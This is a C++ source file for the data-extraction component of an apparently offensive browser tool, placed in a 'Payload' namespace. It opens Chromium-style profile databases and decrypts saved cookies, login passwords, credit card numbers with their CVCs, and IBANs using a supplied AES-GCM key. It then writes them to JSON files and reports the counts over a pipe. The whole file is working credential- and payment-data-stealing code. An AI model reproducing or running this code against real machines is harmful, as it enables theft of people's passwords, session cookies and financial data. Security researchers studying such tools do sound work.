// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "data_extractor.hpp"
#include "../crypto/aes_gcm.hpp"
#include <fstream>
#include <sstream>
#include <iomanip>
#include <map>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase)
        : m_pipe(pipe), m_key(key), m_outputBase(outputBase) {}

    sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
        sqlite3* db = nullptr;
        std::string uri = "file:" + dbPath.string() + "?nolock=1";
        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK) {
            if (db) sqlite3_close(db);
            return nullptr;
        }
        return db;
    }

    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        m_pipe.Log("PROFILE:" + profilePath.filename().string());
        
        try {
            uintmax_t size = 0;
            for(const auto& p : std::filesystem::recursive_directory_iterator(profilePath)) {
                if(!std::filesystem::is_directory(p)) size += std::filesystem::file_size(p);
            }
            m_pipe.LogData("Size", std::to_string(size / 1024 / 1024) + " MB");
        } catch(...) {}

        try {
            // Cookies
            auto cookiePath = profilePath / "Network" / "Cookies";
            if (std::filesystem::exists(cookiePath)) {
                if (auto db = OpenDatabase(cookiePath)) {
                    ExtractCookies(db, m_outputBase / browserName / profilePath.filename() / "cookies.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        try {
            // Passwords
            auto loginPath = profilePath / "Login Data";
            if (std::filesystem::exists(loginPath)) {
                if (auto db = OpenDatabase(loginPath)) {
                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        try {
            // Cards & IBANs (Web Data)
            auto webDataPath = profilePath / "Web Data";
            if (std::filesystem::exists(webDataPath)) {
                if (auto db = OpenDatabase(webDataPath)) {
                    ExtractCards(db, m_outputBase / browserName / profilePath.filename() / "cards.json");
                    ExtractIBANs(db, m_outputBase / browserName / profilePath.filename() / "iban.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}
    }

    void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        int total = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            total++;
            const void* blob = sqlite3_column_blob(stmt, 6);
            int blobLen = sqlite3_column_bytes(stmt, 6);
            
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                
                if (decrypted && decrypted->size() > 32) {
                    std::string val((char*)decrypted->data() + 32, decrypted->size() - 32);
                    
                    std::stringstream ss;
                    ss << "{\"host\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"value\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            // Structured message: COOKIES:extracted:total
            m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
        }
    }

    void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 2);
            int blobLen = sqlite3_column_bytes(stmt, 2);
            
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                
                if (decrypted) {
                    std::string val((char*)decrypted->data(), decrypted->size());
                    std::stringstream ss;
                    ss << "{\"url\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"user\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"pass\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
        // 1. Load CVCs
        std::map<std::string, std::string> cvcMap;
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                const void* blob = sqlite3_column_blob(stmt, 1);
                int len = sqlite3_column_bytes(stmt, 1);
                if (guid && blob && len > 0) {
                    std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                    auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                    if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                }
            }
            sqlite3_finalize(stmt);
        }

        // 2. Extract Cards
        if (sqlite3_prepare_v2(db, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* guid = (const char*)sqlite3_column_text(stmt, 0);
            const void* blob = sqlite3_column_blob(stmt, 4);
            int len = sqlite3_column_bytes(stmt, 4);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string num((char*)dec->data(), dec->size());
                    std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "";
                    
                    std::stringstream ss;
                    ss << "{\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"month\":" << sqlite3_column_int(stmt, 2) << ","
                       << "\"year\":" << sqlite3_column_int(stmt, 3) << ","
                       << "\"number\":\"" << EscapeJson(num) << "\","
                       << "\"cvc\":\"" << EscapeJson(cvc) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("CARDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 0);
            int len = sqlite3_column_bytes(stmt, 0);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    std::stringstream ss;
                    ss << "{\"nickname\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"iban\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("IBANS:" + std::to_string(entries.size()));
        }
    }

    std::string DataExtractor::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"') o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\b') o << "\\b";
            else if (c == '\f') o << "\\f";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f') o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }

}
